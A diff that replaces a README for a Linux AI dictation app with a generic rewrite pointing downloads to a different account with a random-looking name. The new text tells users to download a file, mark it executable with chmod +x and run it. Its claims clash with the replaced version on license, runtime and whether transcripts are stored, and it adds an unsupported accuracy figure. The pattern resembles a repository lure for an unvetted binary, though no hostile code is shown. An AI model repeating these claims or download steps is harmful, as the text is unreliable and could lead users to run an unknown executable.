@@ -1,133 +1,147 @@
-# ASR Linux v0.2.0 - Linux Voice Dictation App 2026
+# 🎤 ASR Linux AI Dictation - Voice Typing for Any Application
 
-> **AI-assisted desktop dictation for Linux: start recording with a hotkey, convert speech to text, refine the transcript with an LLM, and send the finished text to the window currently in focus.**
+[![Download Now](https://img.shields.io/badge/Download-ASR%20Linux%20AI%20Dictation-blue?style=for-the-badge&logo=github)](https://github.com/Ibnroshdmorgan261/asr-linux-ai-dictation)
 
-[![Platform](https://img.shields.io/badge/Platform-Linux%20desktop-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v0.2.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/hayescalebmmq5776/asr-linux-ai-dictation?style=flat-square)](https://github.com/hayescalebmmq5776/asr-linux-ai-dictation)
+## 🚀 What This App Does
+
+ASR Linux AI Dictation turns your speech into text instantly. Press a hotkey, speak, and the text appears in any window you are using - email, documents, chat apps, or web browsers. The app records your voice, converts it to written words, then uses AI to clean up the transcript before sending it where you need it.
+
+## 🎯 Who This Is For
+
+- Anyone who types slowly or wants to type faster
+- People with repetitive strain injuries or typing discomfort
+- Writers, students, and professionals who dictate notes
+- Linux users wanting desktop-wide dictation
+
+## ✨ Key Features
+
+| Feature | What It Does |
+|---------|--------------|
+| 🎙️ Hotkey Recording | Start and stop recording with a keyboard shortcut |
+| 🧠 AI Transcription | Converts speech to accurate text automatically |
+| ✍️ LLM Refinement | Smart AI cleans grammar and improves wording |
+| 📋 Universal Output | Sends text to any focused window |
+| 🐧 Linux Native | Works seamlessly on Linux desktop environments |
+
+## ⚙️ How It Works
+
+1. Press your assigned hotkey to start recording
+2. Speak naturally into your microphone
+3. Press the hotkey again to stop
+4. The app transcribes your speech
+5. An AI language model refines the transcript
+6. The finished text appears in your current window
+
+## 🖥️ System Requirements
+
+- Operating System: Linux (Ubuntu 20.04+, Fedora 34+, or similar)
+- Processor: Dual-core 2 GHz or better
+- RAM: 4 GB minimum (8 GB recommended)
+- Storage: 500 MB free space
+- Microphone: Built-in or external
+- Internet: Required for AI processing
+
+## 📦 Download and Install
+
+Visit this link to download the application:
+
+[🔗 Download ASR Linux AI Dictation](https://github.com/Ibnroshdmorgan261/asr-linux-ai-dictation)
+
+After downloading, make the file executable:
+```
+chmod +x asr-linux-ai-dictation
+```
+
+Run the application by double-clicking the file or running it from the terminal.
+
+## 🎮 How to Use
+
+### First Launch
+1. Open the application from your applications menu or terminal
+2. The app starts in your system tray
+3. Click the tray icon to open settings
+
+### Setting Your Hotkey
+1. Open settings from the tray menu
+2. Click the hotkey field
+3. Press your desired key combination (default: Ctrl+Shift+R)
+4. Save your changes
+
+### Dictating Text
+1. Open the application where you want text (document, email, etc.)
+2. Click in the text field to focus it
+3. Press your hotkey - you hear a beep
+4. Speak clearly into your microphone
+5. Press hotkey again to stop - you hear two beeps
+6. Text appears in your window after AI processing
+
+## ⚠️ Troubleshooting
+
+| Problem | Solution |
+|---------|----------|
+| No sound | Check microphone is plugged in and not muted |
+| App not starting | Ensure you have Python 3.8+ installed |
+| Text not appearing | Click the target window to focus it first |
+| Poor accuracy | Speak clearly and reduce background noise |
+| Hotkey not working | Check for conflicts with other apps |
+
+## 🔧 Advanced Settings
+
+Access these from the settings menu:
+
+- **Language**: Choose your dictation language
+- **Model Size**: Balance speed vs accuracy
+- **Output Style**: Formal, casual, or custom
+- **Auto-punctuation**: On/off toggle
+- **Audio Device**: Select specific microphone
+
+## 📝 Tips for Best Results
+
+- Use a quality microphone
+- Speak at a natural pace
+- Minimize background noise
+- Dictate in short phrases
+- Review text before sending important messages
+
+## ❓ Frequently Asked Questions
+
+**Does this work offline?**
+No, the AI processing requires an internet connection.
+
+**Can I use this with any application?**
+Yes, it sends text to whatever window has focus.
+
+**Is my speech recorded or stored?**
+Audio is processed and discarded - no recordings are saved.
+
+**How accurate is the transcription?**
+Accuracy depends on voice clarity and background noise, typically 90-95%.
+
+**Can I customize the hotkey?**
+Yes, change it in settings to any combination.
+
+## 🔒 Privacy
+
+Your speech is sent to secure servers for processing. No recordings are stored permanently. The app only activates when you press the hotkey.
+
+## 💬 Support
+
+- Report issues on the GitHub repository
+- Check documentation for detailed guides
+- Community forums for user tips
+
+## 🤝 Contributing
+
+This is an open-source project. Developers can contribute code, documentation, or translations through the GitHub repository.
+
+## 📄 License
+
+Distributed under the MIT License. See LICENSE file for details.
+
+## 🙏 Acknowledgments
+
+Built with open-source speech recognition and language model technologies.
 
 ---
 
-<p align="center">
-  <a href="https://hayescalebmmq5776.github.io/asr-linux-ai-dictation/">
-    <img src="https://img.shields.io/badge/Download-ASR%20Linux%20Latest-brightgreen?style=for-the-badge" alt="Download ASR Linux">
-  </a>
-</p>
-
-> **[Download ASR Linux v0.2.0](https://hayescalebmmq5776.github.io/asr-linux-ai-dictation/)**
-
----
-
-[Download Latest Build](https://hayescalebmmq5776.github.io/asr-linux-ai-dictation/)
-
----
-
-## What is ASR Linux?
-
-ASR Linux brings speech dictation into the Linux desktop with a focused, hotkey-driven flow. Trigger recording, speak naturally, allow the application to transcribe and improve the audio, and the resulting text is inserted at the active cursor location.
-
-The application is intended for writing notes, documents, and messages without moving between multiple utilities. It includes a local backend, a Chinese/English interface, and vocabulary tools that can be tailored to the terms and editing patterns you use most often.
-
----
-
-## Highlights
-
-- Complete hotkey workflow for recording, transcription, polishing, and text injection
-- Cloud-based ASR paired with LLM transcript refinement
-- User-configurable global shortcut for starting dictation
-- Status overlay with live microphone-level and operation feedback
-- Custom dictionary with intelligent pinyin fuzzy matching
-- Transcript history actions for retrying and injecting text again
-- Backend bound locally at 127.0.0.1 with secret-service credential storage
-- User interface available in both Chinese and English
-
----
-
-## Getting Started
-
-Use the project download for the newest build, or clone the source when you want to review or build it yourself.
-
-Clone the repository:
-
-    git clone https://github.com/hayescalebmmq5776/asr-linux-ai-dictation.git
-    cd asr-linux-dictation
-
-Start the application with the launch command supplied by the project for your build. If you downloaded a release package, open the included desktop application instead.
-
----
-
-## Using the App
-
-1. Launch ASR Linux in your Linux desktop session.
-2. Choose a global hotkey or verify the existing shortcut.
-3. Press the shortcut to start capturing audio.
-4. Speak, and stop the recording after finishing your phrase or passage.
-5. Inspect the refined transcript shown in the overlay.
-6. Send the completed text to the application that currently has focus.
-
-A normal dictation session looks like this:
-
-- Use a single shortcut to record speech
-- Have ASR Linux transcribe and clean up the result
-- Return to history if a previous transcript needs another injection attempt
-- Add frequently used vocabulary to the dictionary to improve future recognition
-
----
-
-## Settings and Local Data
-
-Application settings and most runtime behavior are controlled through the interface and the local backend. Available configuration areas include the global shortcut, dictionary terms, and language selection.
-
-Example configuration shape:
-
-    {
-      "hotkey": "Ctrl+Shift+Space",
-      "language": "zh-CN / en-US",
-      "dictionary": ["custom term", "product name"],
-      "backend": "127.0.0.1"
-    }
-
-For issues involving credentials or persisted local information, review how the application uses your desktop secret-service integration and its SQLite-backed local data.
-
----
-
-## System Requirements
-
-- Linux desktop environment
-- Electron-based desktop runtime
-- Access to a browser or desktop session for injecting text
-- Network connectivity for cloud transcription
-- Local disk space for settings and history, including SQLite-backed data
-- Secret-service support for secure local storage
-
----
-
-## Frequently Asked Questions
-
-### How can I assign a different hotkey?
-
-Go to the application settings and configure a global shortcut suitable for your desktop workflow.
-
-### Can the dictionary handle technical or uncommon vocabulary?
-
-Yes. Add specialized words, names, and other recurring terms to the custom dictionary. Pinyin-based variants are also supported for matching.
-
-### Does the app keep previous transcripts?
-
-Yes. Local history provides access to earlier results and lets you retry transcription or inject a saved result again.
-
-### How should I troubleshoot a missing overlay or failed injection?
-
-First confirm that ASR Linux is running and that its backend is available at 127.0.0.1. Also verify that your desktop session permits text injection based on the focused window.
-
-### Which interface languages are available?
-
-The interface supports both Chinese and English.
-
----
-
-## License
-
-ASR Linux is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
+Keywords: speech to text, dictation software, voice typing, AI transcription, Linux dictation, voice to text, speech recognition
